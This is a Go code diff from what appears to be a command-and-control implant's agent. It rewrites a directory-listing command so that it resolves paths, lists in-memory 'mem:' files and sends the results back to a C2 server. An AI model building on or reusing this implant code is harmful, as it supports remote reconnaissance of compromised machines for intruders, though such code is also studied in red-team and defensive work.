@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
+	"path/filepath"
 	"runtime"
 	"sort"
 	"strconv"
@@ -35,12 +36,54 @@ func runListDir(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	out, err := util.LsPath(path)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
+	// Helper to format memory file entries
+	listMemFiles := func() {
+		files := util.ListMemFiles()
+		if len(files) == 0 {
+			c2transport.NotifyC2(cmd, "")
+			return
+		}
+		out := getMemFileCompletions(path, files)
+		c2transport.NotifyC2(cmd, "%s", strings.Join(out, "\n"))
+	}
+
+	// Check for memory path
+	if strings.HasPrefix(path, "mem:") { // match mem:, mem:/, mem://
+		listMemFiles()
 		return
 	}
-	c2transport.NotifyC2Binary(cmd, out)
+
+	var listPath string
+	switch path {
+	case ".":
+		cwd, err := os.Getwd()
+		if err != nil {
+			c2transport.NotifyC2(cmd, "Error: %v\n", err)
+			return
+		}
+		listPath = cwd
+	default:
+		absPath, err := filepath.Abs(path)
+		if err != nil {
+			c2transport.NotifyC2(cmd, "Error: %v\n", err)
+			return
+		}
+		listPath = absPath
+	}
+	entries, err := os.ReadDir(listPath)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Error: cant read dir %s: %v\n", listPath, err)
+		return
+	}
+	lines := []string{listPath}
+	for _, entry := range entries {
+		if entry.IsDir() {
+			lines = append(lines, fmt.Sprintf("%s/", entry.Name()))
+		} else {
+			lines = append(lines, entry.Name())
+		}
+	}
+	c2transport.NotifyC2(cmd, "%s", strings.Join(lines, "\n"))
 }
 
 // runStat implements !stat --path <path>
